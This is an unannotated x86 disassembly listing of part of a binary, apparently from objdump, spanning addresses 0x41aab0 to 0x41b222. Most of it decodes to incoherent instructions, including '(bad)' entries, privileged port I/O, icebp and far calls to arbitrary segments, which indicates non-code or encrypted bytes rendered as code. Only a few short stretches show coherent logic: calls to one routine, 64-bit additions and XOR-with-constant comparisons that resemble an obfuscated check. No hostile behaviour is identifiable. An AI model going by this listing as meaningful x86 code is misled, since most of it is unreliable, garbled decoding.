  41aab0:	ins    BYTE PTR es:[edi],dx
  41aab1:	xchg   edi,eax
  41aab2:	mov    al,0x3d
  41aab4:	es xchg esp,eax
  41aab6:	push   es
  41aab7:	lahf   
  41aab8:	retf   
  41aab9:	outs   dx,DWORD PTR ds:[esi]
  41aaba:	sbb    eax,edx
  41aabc:	xchg   esp,eax
  41aabd:	add    eax,0xb65eabe4
  41aac2:	sbb    bl,ch
  41aac4:	jp     0x41ab13
  41aac6:	jmp    FWORD PTR [ecx+0x4e]
  41aac9:	and    ah,ch
  41aacb:	cld    
  41aacc:	ficomp DWORD PTR es:[ebx+edi*4-0x18ad17a6]
  41aad4:	outs   dx,BYTE PTR ds:[esi]
  41aad5:	out    dx,eax
  41aad6:	mov    esi,0x255be402
  41aadb:	clc    
  41aadc:	je     0x41ab34
  41aade:	xlat   BYTE PTR ds:[ebx]
  41aadf:	sbb    BYTE PTR [ebx-0x6e3d485b],0x35
  41aae6:	xchg   ecx,eax
  41aae7:	lods   eax,DWORD PTR ds:[esi]
  41aae8:	sbb    edx,DWORD PTR [ecx]
  41aaea:	mov    ch,bl
  41aaec:	retf   
  41aaed:	mov    edi,0xbe0e920b
  41aaf2:	or     BYTE PTR [ecx],ch
  41aaf4:	sub    BYTE PTR [esp+edx*2+0xa],0x4e
  41aaf9:	mov    BYTE PTR [ebx-0xe7d7b0d],bh
  41aaff:	stc    
  41ab00:	push   edi
  41ab01:	mov    ch,0xeb
  41ab03:	bound  edx,QWORD PTR [ebx+0x245c8b46]
  41ab09:	xor    al,0x53
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x422046
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x422046
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x4f94b3d0],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0xe211818],bh
  41ab67:	addr16 das 
  41ab69:	pusha  
  41ab6a:	add    BYTE PTR [eax],dl
  41ab6c:	sbb    al,0x4
  41ab6e:	ror    DWORD PTR es:[esp+edx*1+0x278ef19b],0xac
  41ab77:	jnp    0x41abcb
  41ab79:	aam    0xf0
  41ab7b:	mov    dh,0x5b
  41ab7d:	js     0x41abce
  41ab7f:	je     0x41ab12
  41ab81:	dec    DWORD PTR [ecx]
  41ab83:	cmp    BYTE PTR [edx-0x35],ch
  41ab86:	jge    0x41ab2e
  41ab88:	push   ss
  41ab89:	aad    0x54
  41ab8b:	data16 out 0x2,al
  41ab8e:	ffree  st(1)
  41ab90:	fwait
  41ab91:	cmp    DWORD PTR [edi],ebx
  41ab93:	popa   
  41ab94:	jle    0x41ab4d
  41ab96:	loope  0x41ab50
  41ab98:	xor    ebp,DWORD PTR [ebp+esi*2-0x7ad15b3c]
  41ab9f:	test   DWORD PTR [eax+0x5f],esi
  41aba2:	and    BYTE PTR [ebp-0x32],bl
  41aba5:	ins    BYTE PTR es:[edi],dx
  41aba6:	mov    bh,0xde
  41aba8:	fistp  QWORD PTR [eax-0x24b23446]
  41abae:	stc    
  41abaf:	fucom  st(2)
  41abb1:	lods   al,BYTE PTR ds:[esi]
  41abb2:	xchg   esp,eax
  41abb3:	and    eax,0x95b030e3
  41abb8:	and    bl,BYTE PTR [esi+0x9b87325]
  41abbe:	cmp    DWORD PTR [edi-0x774ef365],eax
  41abc4:	addr16 retf 
  41abc6:	je     0x41ab8f
  41abc8:	push   ss
  41abc9:	int3   
  41abca:	mov    ds:0xacb31421,al
  41abcf:	mov    bl,0x18
  41abd1:	push   ecx
  41abd2:	push   ebx
  41abd3:	mov    ah,0x9d
  41abd5:	mov    ch,0x65
  41abd7:	sbb    eax,0x37220da1
  41abdc:	xlat   BYTE PTR ds:[ebx]
  41abdd:	inc    eax
  41abde:	and    al,0x92
  41abe0:	mov    edi,0xc39dcaf2
  41abe5:	daa    
  41abe6:	adc    eax,0x55d26573
  41abeb:	pop    ss
  41abec:	out    dx,al
  41abed:	and    eax,0x560ceb9e
  41abf2:	int    0xc4
  41abf4:	rcl    DWORD PTR [ebx],cl
  41abf6:	aam    0x7f
  41abf8:	cmp    esp,DWORD PTR [eax]
  41abfa:	jae    0x41ab9b
  41abfc:	pushw  es
  41abfe:	sub    al,0x1d
  41ac00:	jo     0x41ab8c
  41ac02:	les    ebp,FWORD PTR ds:0x1106dfc1
  41ac08:	sbb    esi,edi
  41ac0a:	das    
  41ac0b:	stos   DWORD PTR es:[edi],eax
  41ac0c:	pop    esi
  41ac0d:	test   al,0xd4
  41ac0f:	cdq    
  41ac10:	test   BYTE PTR [ebx+0x72],ah
  41ac13:	xchg   esi,eax
  41ac14:	rcr    BYTE PTR [esi+0x260e13f],0xa9
  41ac1b:	and    eax,0xe5f64de0
  41ac20:	out    dx,eax
  41ac21:	(bad)  
  41ac22:	xchg   edx,eax
  41ac23:	jl     0x41ac2b
  41ac25:	int3   
  41ac26:	call   0x211110cd
  41ac2b:	test   ebx,ebx
  41ac2d:	outs   dx,BYTE PTR ds:[esi]
  41ac2e:	or     cl,BYTE PTR [eax+eax*2]
  41ac31:	jl     0x41ac18
  41ac33:	add    dh,BYTE PTR [ebp+0x42]
  41ac36:	sbb    eax,0xfa179ac2
  41ac3b:	(bad)  
  41ac3c:	aam    0xae
  41ac3e:	jo     0x41abf8
  41ac40:	jge    0x41ac2b
  41ac42:	iret   
  41ac43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac44:	cdq    
  41ac45:	cmp    BYTE PTR [esi-0x5af241af],0x7b
  41ac4c:	popa   
  41ac4d:	rol    BYTE PTR [edi-0x60cc24a1],0xf7
  41ac54:	mov    al,0x6a
  41ac56:	test   ebx,ebx
  41ac58:	cli    
  41ac59:	and    BYTE PTR [esi+0x4885dfde],al
  41ac5f:	sub    eax,0xb0ff0ac6
  41ac64:	sub    al,0xb3
  41ac66:	mov    dh,0xb0
  41ac68:	sub    DWORD PTR ds:0x96cc3e8,esi
  41ac6e:	das    
  41ac6f:	outs   dx,DWORD PTR ds:[esi]
  41ac70:	jno    0x41ac8b
  41ac72:	lahf   
  41ac73:	ret    0x7cb7
  41ac76:	jae    0x41acd5
  41ac78:	rcl    BYTE PTR [edx+0x57],0xba
  41ac7c:	fistp  DWORD PTR [edi-0x30a70c9b]
  41ac82:	jne    0x41ac0b
  41ac84:	popf   
  41ac85:	fist   DWORD PTR [esi+0x47a15d8e]
  41ac8b:	add    al,ch
  41ac8d:	mov    edi,0x3b2106bc
  41ac92:	xor    ch,ah
  41ac94:	sbb    cl,BYTE PTR [esi-0x32]
  41ac97:	xor    DWORD PTR [ebx-0x427035ef],ebx
  41ac9d:	loopne 0x41ac9d
  41ac9f:	lods   eax,DWORD PTR ds:[esi]
  41aca0:	jmp    DWORD PTR [edx-0xe]
  41aca3:	fwait
  41aca4:	mov    al,BYTE PTR [ebx-0x59]
  41aca7:	or     eax,0xf41a3a26
  41acac:	cmp    BYTE PTR [esi+0x5af79a42],al
  41acb2:	repnz inc ebx
  41acb4:	aas    
  41acb5:	pop    eax
  41acb6:	mov    ss,ecx
  41acb8:	cmp    eax,0xd20101b5
  41acbd:	jb     0x41ad05
  41acbf:	repnz loop 0x41acf2
  41acc2:	xchg   edi,eax
  41acc3:	jecxz  0x41acdc
  41acc5:	aas    
  41acc6:	cmp    DWORD PTR [ecx+0x25],eax
  41acc9:	xor    BYTE PTR [eax+0x5e],dh
  41accc:	ret    0xf251
  41accf:	in     eax,dx
  41acd0:	cmp    cl,BYTE PTR [eax+0x3]
  41acd3:	xlat   BYTE PTR ds:[ebx]
  41acd4:	mov    dh,0xb4
  41acd6:	mov    esi,ds
  41acd8:	pop    ebx
  41acd9:	mov    bh,0xc2
  41acdb:	push   edi
  41acdc:	nop
  41acdd:	stc    
  41acde:	daa    
  41acdf:	xor    bh,bl
  41ace1:	mov    ebx,0xd84fc6b4
  41ace6:	scas   al,BYTE PTR es:[edi]
  41ace7:	sub    eax,0x5f23bc4c
  41acec:	mov    DWORD PTR ds:0xe3c080e3,edx
  41acf2:	mov    cl,0x81
  41acf4:	fdivr  QWORD PTR [esi-0x473d6a0]
  41acfa:	jo     0x41ad40
  41acfc:	shl    DWORD PTR [ebp-0x3d449633],0x4c
  41ad03:	sub    al,0x7
  41ad05:	call   0x2330:0x5e939cb5
  41ad0c:	sub    BYTE PTR [ebx-0x33],al
  41ad0f:	mov    WORD PTR [ecx],gs
  41ad11:	daa    
  41ad12:	sub    eax,0xd0fab747
  41ad17:	jns    0x41ad52
  41ad19:	sbb    al,0xab
  41ad1b:	test   BYTE PTR ds:0x95bfcaf6,cl
  41ad21:	mov    ds:0xf04a6041,al
  41ad26:	add    BYTE PTR [edi+0x27],dl
  41ad29:	mov    al,ds:0x7578dbfb
  41ad2e:	lock mov cl,0x3b
  41ad31:	cld    
  41ad32:	call   0x41da:0x9b81f104
  41ad39:	inc    edx
  41ad3a:	pop    ss
  41ad3b:	sbb    BYTE PTR [eax-0xd],dh
  41ad3e:	sub    eax,0x83374abc
  41ad43:	xchg   edi,eax
  41ad44:	sbb    DWORD PTR [ebx],esp
  41ad46:	push   edx
  41ad47:	shr    BYTE PTR [edi],cl
  41ad49:	ss repz out 0x17,al
  41ad4d:	inc    edi
  41ad4e:	cmp    DWORD PTR ds:0x144542ea,eax
  41ad54:	clc    
  41ad55:	das    
  41ad56:	mov    eax,ds:0xb2391010
  41ad5b:	and    dl,dh
  41ad5d:	test   eax,0x82780e3b
  41ad62:	cmp    ebx,DWORD PTR [edi-0x47]
  41ad65:	enter  0xcb3f,0x36
  41ad69:	daa    
  41ad6a:	dec    edx
  41ad6b:	jne    0x41adbd
  41ad6d:	jge    0x41ad28
  41ad6f:	repz adc eax,0xe37536ab
  41ad75:	sbb    eax,0xf4474507
  41ad7a:	sub    edx,DWORD PTR [eax+0x785f8283]
  41ad80:	push   ss
  41ad81:	xchg   edx,eax
  41ad82:	in     al,dx
  41ad83:	cmp    DWORD PTR [ebx-0x5a],0x0
  41ad87:	or     al,0x6e
  41ad89:	sti    
  41ad8a:	loope  0x41adbf
  41ad8c:	rcr    BYTE PTR [ecx+edi*1],0x19
  41ad90:	lods   eax,DWORD PTR ds:[esi]
  41ad91:	inc    ebx
  41ad92:	aam    0xbc
  41ad94:	or     DWORD PTR [edi],0x29
  41ad97:	cmc    
  41ad98:	fstp   DWORD PTR [edi-0x10a48b22]
  41ad9e:	popa   
  41ad9f:	popf   
  41ada0:	iret   
  41ada1:	fld    TBYTE PTR ds:0x99fc1321
  41ada7:	mov    cl,0x96
  41ada9:	and    ch,BYTE PTR [edx+eiz*1+0x4f]
  41adad:	dec    eax
  41adae:	sbb    esi,DWORD PTR [eax]
  41adb0:	repz push ecx
  41adb2:	in     al,dx
  41adb3:	dec    ebp
  41adb4:	ja     0x41ae0e
  41adb6:	mov    edx,DWORD PTR [ecx]
  41adb8:	sar    DWORD PTR [edx+0x2e4a6363],1
  41adbe:	xchg   edi,eax
  41adbf:	popa   
  41adc0:	scas   al,BYTE PTR es:[edi]
  41adc1:	mov    WORD PTR [ecx-0x1dfad028],ds
  41adc7:	mov    ebx,0x9349e008
  41adcc:	stos   BYTE PTR es:[edi],al
  41adcd:	or     DWORD PTR [ebx],ecx
  41adcf:	or     ah,BYTE PTR [eax]
  41add1:	mov    WORD PTR [edx],?
  41add3:	mov    eax,ds:0x3bcd6081
  41add8:	jbe    0x41ad75
  41adda:	add    al,0x6b
  41addc:	stos   DWORD PTR es:[edi],eax
  41addd:	inc    edx
  41adde:	pop    ebx
  41addf:	test   DWORD PTR [edx-0x8096874],ebp
  41ade5:	inc    esp
  41ade6:	imul   ebx,DWORD PTR [ebp-0x691eb7aa],0x51
  41aded:	in     al,0x66
  41adef:	call   0x7b2e9a3d
  41adf4:	test   BYTE PTR [ecx-0x18064dc0],dl
  41adfa:	mov    cs,ebx
  41adfc:	leave  
  41adfd:	sbb    ebp,esi
  41adff:	jmp    0x1986:0xb846c32f
  41ae06:	inc    esi
  41ae07:	je     0x41ae22
  41ae09:	lods   eax,DWORD PTR ds:[esi]
  41ae0a:	idiv   BYTE PTR [esi-0x3]
  41ae0d:	data16 loop 0x41ae00
  41ae10:	and    eax,DWORD PTR [eax+eax*2]
  41ae13:	xchg   di,ax
  41ae15:	mov    edx,0x6f927c96
  41ae1a:	cwde   
  41ae1b:	mov    esi,0xbe828b34
  41ae20:	mov    al,BYTE PTR [esi]
  41ae22:	jno    0x41adf3
  41ae24:	push   ebx
  41ae25:	xchg   ebp,eax
  41ae26:	cmp    al,0xa5
  41ae28:	push   ebx
  41ae29:	sti    
  41ae2a:	in     al,0x91
  41ae2c:	adc    dl,bl
  41ae2e:	mov    bh,ch
  41ae30:	aad    0xa
  41ae32:	js     0x41ae73
  41ae34:	xor    ebx,DWORD PTR [edi-0x6c2d5ed9]
  41ae3a:	mov    ch,0xf0
  41ae3c:	jb     0x41adbe
  41ae3e:	pusha  
  41ae3f:	push   esi
  41ae40:	pop    edi
  41ae41:	xchg   ebx,eax
  41ae42:	jne    0x41adf8
  41ae44:	jo     0x41ae43
  41ae46:	add    eax,0x72193832
  41ae4c:	ins    DWORD PTR es:[edi],dx
  41ae4d:	cdq    
  41ae4e:	sbb    al,0xd4
  41ae50:	mov    esi,0x3a37c3f7
  41ae55:	pop    esi
  41ae56:	repz dec ebx
  41ae58:	test   al,0xca
  41ae5a:	or     ch,BYTE PTR [ebx]
  41ae5c:	jns    0x41ae27
  41ae5e:	or     ebp,edi
  41ae60:	outs   dx,DWORD PTR ds:[esi]
  41ae61:	out    dx,eax
  41ae62:	xchg   edx,eax
  41ae63:	lock loopne 0x41ae31
  41ae66:	jecxz  0x41ae8d
  41ae68:	je     0x41ae2a
  41ae6a:	mov    dh,dh
  41ae6c:	dec    edi
  41ae6d:	iret   
  41ae6e:	retf   
  41ae6f:	sbb    dh,bl
  41ae71:	adc    al,0x8d
  41ae73:	xchg   edx,eax
  41ae74:	xlat   BYTE PTR ds:[ebx]
  41ae75:	lods   al,BYTE PTR ds:[esi]
  41ae76:	cli    
  41ae77:	add    edx,DWORD PTR [esi]
  41ae79:	mov    bl,0x85
  41ae7b:	pop    ss
  41ae7c:	jae    0x41ae0b
  41ae7e:	pop    ss
  41ae7f:	xor    dl,BYTE PTR [edi]
  41ae81:	inc    edi
  41ae82:	popa   
  41ae83:	aaa    
  41ae84:	or     al,0x7f
  41ae86:	sbb    al,0x6
  41ae88:	in     al,0x75
  41ae8a:	mov    cl,0x72
  41ae8c:	call   0x1b2b3514
  41ae91:	(bad)  
  41ae92:	retf   
  41ae93:	(bad)  
  41ae94:	sbb    dh,bl
  41ae96:	and    esp,esp
  41ae98:	push   edx
  41ae99:	dec    esi
  41ae9a:	lods   al,BYTE PTR ds:[esi]
  41ae9b:	lods   eax,DWORD PTR ds:[esi]
  41ae9c:	rcr    DWORD PTR [ebp+0x46],0x3a
  41aea0:	je     0x41ae64
  41aea2:	mov    cl,0xbc
  41aea4:	cmp    eax,0x13e70d86
  41aea9:	(bad)  
  41aeaa:	out    0xe7,eax
  41aeac:	lods   eax,DWORD PTR ds:[esi]
  41aead:	mov    dh,0x42
  41aeaf:	dec    edx
  41aeb0:	in     al,0xac
  41aeb2:	pop    ebx
  41aeb3:	data16 xor ch,cl
  41aeb6:	repnz pusha 
  41aeb8:	and    ch,BYTE PTR [eax+0x31089b59]
  41aebe:	mov    BYTE PTR [edx+esi*8-0x670010da],dh
  41aec5:	or     DWORD PTR [edx-0x6f],ecx
  41aec8:	mov    edx,0xccf70409
  41aecd:	jp     0x41aefd
  41aecf:	jae    0x41ae86
  41aed1:	mov    ds:0x23b03b18,eax
  41aed7:	pushf  
  41aed8:	stc    
  41aed9:	jmp    0x41af34
  41aedb:	ss sbb al,0xdd
  41aede:	sub    BYTE PTR [edi-0x70c32891],cl
  41aee4:	call   0x8be09b82
  41aee9:	push   ebx
  41aeea:	push   edi
  41aeeb:	jge    0x41aec4
  41aeed:	pusha  
  41aeee:	xchg   BYTE PTR [esi+0x4f],ch
  41aef1:	cmp    eax,0x69bba32d
  41aef6:	bound  eax,QWORD PTR [edx]
  41aef8:	xchg   edi,eax
  41aef9:	xor    DWORD PTR [ecx-0x26],ebp
  41aefc:	dec    esp
  41aefd:	adc    cl,dl
  41aeff:	sub    DWORD PTR [ecx+esi*4+0x14db88b5],esp
  41af06:	xor    DWORD PTR [ebp+0x6cac82ea],0x17
  41af0d:	jne    0x41af04
  41af0f:	or     edi,DWORD PTR [ecx-0x695c7f6e]
  41af15:	pop    edi
  41af16:	inc    ebx
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af8a
  41af80:	imul   ecx,DWORD PTR [esi],0x1697177e
  41af86:	sbb    BYTE PTR [edx+edx*1+0x1cb61818],bh
  41af8d:	repnz stc 
  41af8f:	sti    
  41af90:	js     0x41af36
  41af92:	mov    edx,0x8cb4b040
  41af97:	inc    esp
  41af98:	adc    bh,BYTE PTR [ebp+edi*4-0x36]
  41af9c:	push   ebx
  41af9d:	dec    edi
  41af9e:	sbb    eax,0xd399bfcc
  41afa3:	sub    al,0xd2
  41afa5:	int3   
  41afa6:	push   es
  41afa7:	push   ss
  41afa8:	sti    
  41afa9:	adc    DWORD PTR [ebx-0x66],0x2547e478
  41afb0:	fcomi  st,st(3)
  41afb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb3:	xchg   ebp,eax
  41afb4:	push   ss
  41afb5:	or     DWORD PTR [edx+0x26f11533],eax
  41afbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afbc:	jle    0x41af59
  41afbe:	repz sbb esi,DWORD PTR [eax-0xe]
  41afc2:	jg     0x41b010
  41afc4:	enter  0xa82f,0x76
  41afc8:	into   
  41afc9:	pop    eax
  41afca:	xchg   esp,eax
  41afcb:	int    0x81
  41afcd:	xchg   edi,eax
  41afce:	jle    0x41afc4
  41afd0:	push   esp
  41afd1:	xchg   edi,eax
  41afd2:	sbb    dl,dh
  41afd4:	aas    
  41afd5:	fwait
  41afd6:	pop    ds
  41afd7:	out    dx,eax
  41afd8:	xchg   edi,eax
  41afd9:	ret    
  41afda:	(bad)  
  41afdb:	add    ecx,DWORD PTR gs:0xc31079dd
  41afe2:	xchg   ebp,eax
  41afe3:	push   0x63962eeb
  41afe8:	or     edi,edx
  41afea:	mov    ebp,0x964ee6d3
  41afef:	dec    esi
  41aff0:	inc    esi
  41aff1:	call   0x3545:0xea65ac7d
  41aff8:	jbe    0x41afc4
  41affa:	mov    esp,0xba069c84
  41afff:	xchg   esi,eax
  41b000:	pop    ecx
  41b001:	xor    cl,dh
  41b003:	outs   dx,DWORD PTR ds:[esi]
  41b004:	call   0xa0fe413d
  41b009:	mov    cl,0x77
  41b00b:	sub    ch,BYTE PTR [eax+eax*8]
  41b00e:	jb     0x41afd3
  41b010:	in     al,dx
  41b011:	mov    ds:0x80eb87cc,al
  41b016:	sub    DWORD PTR [ecx+0x0],0xc
  41b01a:	scas   al,BYTE PTR es:[edi]
  41b01b:	push   ebp
  41b01c:	adc    eax,0x349fcb5f
  41b021:	and    DWORD PTR [edx-0x46],ecx
  41b024:	ror    BYTE PTR ds:0xe747a2b4,1
  41b02a:	leave  
  41b02b:	repz int 0x97
  41b02e:	xor    DWORD PTR [ecx+eax*4],0x1c6cc711
  41b035:	sub    al,cl
  41b037:	jb     0x41b045
  41b039:	dec    esp
  41b03a:	in     eax,dx
  41b03b:	cmc    
  41b03c:	lahf   
  41b03d:	shr    BYTE PTR [edi],cl
  41b03f:	inc    edi
  41b040:	push   esp
  41b041:	pop    es
  41b042:	push   edi
  41b043:	jle    0x41b07f
  41b045:	push   esi
  41b046:	dec    ebp
  41b047:	stc    
  41b048:	in     al,0x88
  41b04a:	outs   dx,BYTE PTR ds:[esi]
  41b04b:	in     eax,dx
  41b04c:	fs sbb DWORD PTR ss:[edi+0x6c4f7e02],edx
  41b054:	cs shl ch,1
  41b057:	icebp  
  41b058:	mov    BYTE PTR [ebp-0x76],bl
  41b05b:	out    0x2f,eax
  41b05d:	pop    es
  41b05e:	int3   
  41b05f:	pop    edx
  41b060:	dec    ebx
  41b061:	inc    edi
  41b062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b063:	dec    esp
  41b064:	out    dx,eax
  41b065:	lahf   
  41b066:	mov    ah,0x2e
  41b068:	jp     0x41b083
  41b06a:	inc    edx
  41b06b:	out    0x55,eax
  41b06d:	test   al,0xb8
  41b06f:	pop    ebx
  41b070:	es (bad) 
  41b072:	xor    eax,DWORD PTR [edx]
  41b074:	ja     0x41b08b
  41b076:	pushf  
  41b077:	repnz sbb cl,ah
  41b07a:	add    al,0xb4
  41b07c:	inc    ebp
  41b07d:	mov    ds:0x4f3504cd,eax
  41b082:	mov    ds:0xdc2e9f17,eax
  41b087:	jno    0x41b0ff
  41b089:	and    BYTE PTR [ebp-0x555e1c8e],0xf8
  41b090:	leave  
  41b091:	xchg   edi,eax
  41b092:	pop    ds
  41b093:	cmp    DWORD PTR [eax],ebx
  41b095:	cmp    DWORD PTR [eax],eax
  41b097:	dec    esi
  41b098:	jbe    0x41b027
  41b09a:	xchg   edi,eax
  41b09b:	mov    WORD PTR [edx-0x56],fs
  41b09e:	dec    edx
  41b09f:	sbb    al,0x9b
  41b0a1:	retf   0x3c5f
  41b0a4:	popf   
  41b0a5:	fisubr WORD PTR [edi-0x18]
  41b0a8:	imul   esi,ecx,0x68
  41b0ab:	sbb    DWORD PTR [esi-0x65],eax
  41b0ae:	div    BYTE PTR [ebx+0x2e]
  41b0b1:	jp     0x41b063
  41b0b3:	inc    ecx
  41b0b4:	mov    esp,0xc62207f1
  41b0b9:	cmp    dh,bl
  41b0bb:	shr    DWORD PTR ds:[eax],1
  41b0be:	int3   
  41b0bf:	sbb    ah,al
  41b0c1:	icebp  
  41b0c2:	nop
  41b0c3:	pop    ds
  41b0c4:	lods   al,BYTE PTR ds:[esi]
  41b0c5:	mov    edi,0x23cf250d
  41b0ca:	lea    eax,[esi]
  41b0cc:	jle    0x41b062
  41b0ce:	push   ebx
  41b0cf:	ins    BYTE PTR es:[edi],dx
  41b0d0:	rcr    DWORD PTR ds:0x6aaa680e,cl
  41b0d6:	add    BYTE PTR [di-0x63],cl
  41b0da:	aad    0xec
  41b0dc:	inc    eax
  41b0dd:	pop    ebx
  41b0de:	pop    ecx
  41b0df:	pop    ebp
  41b0e0:	pop    esp
  41b0e1:	mov    ebp,ebx
  41b0e3:	stc    
  41b0e4:	mov    al,ds:0x11b137e6
  41b0e9:	push   0xffffffeb
  41b0eb:	cmc    
  41b0ec:	outs   dx,DWORD PTR ds:[esi]
  41b0ed:	mov    al,0x16
  41b0ef:	shl    DWORD PTR [esi-0x3f],0x1
  41b0f3:	push   ebx
  41b0f4:	jmp    0x41b096
  41b0f6:	ret    0x161d
  41b0f9:	out    dx,al
  41b0fa:	add    DWORD PTR [edi+edx*8+0x4401e7f2],ebp
  41b101:	sbb    ebp,DWORD PTR [ecx+ebx*1+0x15]
  41b105:	jbe    0x41b119
  41b107:	sub    DWORD PTR [esi+0x22],0x6bde9f8a
  41b10e:	mov    al,BYTE PTR [eax-0x24]
  41b111:	imul   edi,esi,0x40
  41b114:	and    DWORD PTR [esi],0x42e8b3bb
  41b11a:	test   BYTE PTR [edi+0x78],ch
  41b11d:	in     eax,0x5b
  41b11f:	lock clc 
  41b121:	repnz aaa 
  41b123:	jge    0x41b0f6
  41b125:	push   es
  41b126:	push   ss
  41b127:	fucomi st,st(3)
  41b129:	mov    bh,0xc5
  41b12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12c:	adc    DWORD PTR [eax],ebx
  41b12e:	fcomp  QWORD PTR [ecx-0x6e4d246d]
  41b134:	xlat   BYTE PTR ds:[ebx]
  41b135:	adc    al,0x5
  41b137:	jmp    0x41b169
  41b139:	sub    BYTE PTR ds:0xa5a30634,ah
  41b13f:	iret   
  41b140:	neg    DWORD PTR [edi+ebp*1]
  41b143:	out    dx,eax
  41b144:	shl    ebp,1
  41b146:	call   0x9a2e7aa4
  41b14b:	cmp    ecx,DWORD PTR [ecx-0x50037500]
  41b151:	and    esi,ecx
  41b153:	xchg   ebx,eax
  41b154:	rcr    DWORD PTR [ebx+0x74],0x1f
  41b158:	or     dl,BYTE PTR [edi+0x24]
  41b15b:	and    BYTE PTR [ebp+0x2271de1],dh
  41b161:	repz mov ds:0xe55bfe6c,al
  41b167:	fld    TBYTE PTR [eax-0x4d]
  41b16a:	add    DWORD PTR [eax],0x46a2f6d9
  41b170:	or     al,0x51
  41b172:	sbb    eax,0xa2833e88
  41b177:	lods   al,BYTE PTR ds:[esi]
  41b178:	cmp    cl,BYTE PTR [edx-0x3e]
  41b17b:	sti    
  41b17c:	(bad)  
  41b17d:	test   al,0xaa
  41b17f:	lock jg 0x41b172
  41b182:	or     ebp,DWORD PTR [ebx+eiz*2]
  41b185:	xor    al,0xf1
  41b187:	inc    edx
  41b188:	dec    edx
  41b189:	push   esi
  41b18a:	mov    dh,0x97
  41b18c:	jmp    0xf09b:0x7057cc8a
  41b193:	cmp    dl,BYTE PTR [ebx]
  41b195:	out    0xab,al
  41b197:	xchg   ebp,eax
  41b198:	sbb    DWORD PTR [ebx-0x78],eax
  41b19b:	add    ebp,eax
  41b19d:	xor    dl,0x27
  41b1a0:	cmp    al,0xe6
  41b1a2:	pop    edx
  41b1a3:	push   esi
  41b1a4:	push   ss
  41b1a5:	inc    ebp
  41b1a6:	jmp    0x41b1d0
  41b1a8:	test   BYTE PTR [ebx+0x5ba375c3],dl
  41b1ae:	adc    al,0x2f
  41b1b0:	mov    bl,0x92
  41b1b2:	sub    eax,0xc11d7f18
  41b1b7:	popf   
  41b1b8:	cmc    
  41b1b9:	cmp    DWORD PTR [edx],edx
  41b1bb:	mov    dh,0xb6
  41b1bd:	pushf  
  41b1be:	xchg   BYTE PTR [edx],al
  41b1c0:	(bad)  
  41b1c1:	out    0x51,al
  41b1c3:	mov    bh,0xcf
  41b1c5:	divps  xmm3,XMMWORD PTR [ebp+0x3f]
  41b1c9:	dec    ebp
  41b1ca:	call   0x5ec7:0x9d390918
  41b1d1:	gs loope 0x41b19d
  41b1d4:	xchg   ebx,eax
  41b1d5:	inc    edx
  41b1d6:	sub    al,0xe2
  41b1d8:	ret    0xb2a4
  41b1db:	cmp    al,0xe5
  41b1dd:	push   ds
  41b1de:	std    
  41b1df:	test   al,0x12
  41b1e1:	push   edx
  41b1e2:	rcr    BYTE PTR [ebp-0x61],1
  41b1e5:	sub    eax,0xfddc4614
  41b1ea:	shl    BYTE PTR [eax+esi*8+0x71],0x68
  41b1ef:	ret    
  41b1f0:	cmp    DWORD PTR [esi+edi*1],esp
  41b1f3:	add    eax,0x60dea762
  41b1f8:	jecxz  0x41b1dc
  41b1fa:	sbb    DWORD PTR [esi+0x3d712405],ebx
  41b200:	ds jbe 0x41b242
  41b203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b204:	mov    bl,0x95
  41b206:	mov    al,ds:0xa4bb8ac8
  41b20b:	sub    eax,ebx
  41b20d:	inc    eax
  41b20e:	test   al,0x6f
  41b210:	jl     0x41b236
  41b212:	xchg   ecx,eax
  41b213:	fidivr DWORD PTR [eax]
  41b215:	push   ds
  41b216:	dec    ebx
  41b217:	push   edi
  41b218:	icebp  
  41b219:	fisubr WORD PTR [edi+0x1b]
  41b21c:	add    al,0xf7
  41b21e:	pop    esi
  41b21f:	mov    edx,DWORD PTR [ebp-0x12]
  41b222:	icebp  
